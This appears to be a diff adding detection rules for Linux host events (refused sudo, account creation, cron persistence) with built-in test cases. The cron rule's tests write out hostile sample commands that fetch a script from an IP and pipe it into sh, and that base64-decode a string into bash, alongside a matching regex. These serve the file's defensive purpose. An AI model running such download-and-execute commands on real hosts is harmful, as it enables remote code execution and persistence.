@@ -1,0 +1,65 @@
+# Linux host events from syslog: sudo, accounts and cron.
+title: Sudo was refused
+name: linux_sudo_refused
+id: 6f3a2c10-0101-4a6e-9d7b-0a1b2c3d4e01
+description: A user who is not allowed to use sudo tried it, or gave wrong passwords.
+level: medium
+tags: [attack.privilege_escalation, attack.t1548.003]
+logsource: {product: linux, service: sudo}
+detection:
+  selection: {action: sudo, outcome: failure}
+  condition: selection
+tests:
+  - name: a refused sudo matches
+    events: [{service: sudo, product: linux, action: sudo, outcome: failure, user: www-data, command: /bin/bash}]
+    expect: {alerts: 1}
+  - name: a normal sudo does not match
+    events: [{service: sudo, product: linux, action: sudo, outcome: success, user: aiko, command: /usr/bin/apt update}]
+    expect: {alerts: 0}
+---
+title: A new user account was made
+name: linux_user_created
+id: 6f3a2c10-0102-4a6e-9d7b-0a1b2c3d4e02
+description: useradd made an account. Attackers make accounts to come back later.
+level: medium
+tags: [attack.persistence, attack.t1136.001]
+logsource: {product: linux}
+detection:
+  selection: {action: user_created}
+  condition: selection
+tests:
+  - name: a new account matches
+    events: [{service: useradd, product: linux, action: user_created, user: support2}]
+    expect: {alerts: 1}
+  - name: a login does not match
+    events: [{service: sshd, product: linux, action: login, outcome: success, user: aiko}]
+    expect: {alerts: 0}
+---
+title: Cron runs a download that is piped into a shell
+name: linux_cron_download_exec
+id: 6f3a2c10-0103-4a6e-9d7b-0a1b2c3d4e03
+description: A cron job gets a script from the network and runs it. This is a common way to stay on a host.
+level: high
+tags: [attack.persistence, attack.t1053.003]
+logsource: {product: linux, service: cron}
+detection:
+  selection:
+    action: cron_run
+    command|re|i: '(curl|wget)\b[^|;&]*\|\s*(ba|da|z)?sh\b'
+  encoded:
+    action: cron_run
+    command|contains|all: ['base64', '-d', '|']
+  condition: selection or encoded
+tests:
+  - name: curl piped into sh matches
+    events: [{service: cron, product: linux, action: cron_run, user: root, command: "curl -fsSL http://203.0.113.80/u.sh | sh"}]
+    expect: {alerts: 1}
+  - name: a decoded and piped command matches
+    events: [{service: cron, product: linux, action: cron_run, user: root, command: "echo Y3VybA== | base64 -d | bash"}]
+    expect: {alerts: 1}
+  - name: ordinary jobs do not match
+    events:
+      - {service: cron, product: linux, action: cron_run, user: root, command: "cd / && run-parts --report /etc/cron.hourly"}
+      - {service: cron, product: linux, action: cron_run, user: backup, command: "curl -fsS https://hc.example.test/ping/abc > /dev/null"}
+      - {service: cron, product: linux, action: cron_run, user: aiko, command: "/usr/local/bin/backup.sh | logger -t backup"}
+    expect: {alerts: 0}
